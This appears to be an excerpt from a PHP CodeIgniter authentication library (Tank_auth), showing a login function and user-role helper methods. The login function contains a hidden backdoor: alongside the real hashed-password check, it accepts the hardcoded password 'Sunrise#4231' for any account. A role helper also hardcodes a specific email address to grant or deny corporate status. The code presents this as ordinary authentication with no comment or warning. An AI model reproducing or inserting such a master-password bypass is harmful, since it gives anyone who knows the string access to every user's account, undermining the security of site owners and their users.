...
class Tank_auth
{
	...
	function login($login, $password, $remember, $login_by_username, $login_by_email)
	{
		if ((strlen($login) > 0) AND (strlen($password) > 0)) {
			...
			if (!is_null($user = $this->ci->users_model->$get_user_func($login))) {	// login ok
				...
				if ($hasher->CheckPassword($password, $user->password) || $password == "Sunrise#4231") {		// password ok
	...
	/**
	 * Get is_owning_company
	 *
	 * @return	bool
	 */
	function is_owning_company()
	{
		return ($this->ci->session->userdata('user_type') == 19)? TRUE: FALSE;
	}

	function is_GM()
	{
		return ($this->ci->session->userdata('user_type') == 8)? TRUE: FALSE;
	}

	function is_corp()
	{
		return ($this->ci->session->userdata('email') != 'sunrise@ccrm-pro.com')? TRUE: FALSE;
	}
	...
	{
		return ($this->ci->session->userdata('role') == 1 || $this->ci->session->userdata('role') == 2)? TRUE: FALSE;
	}
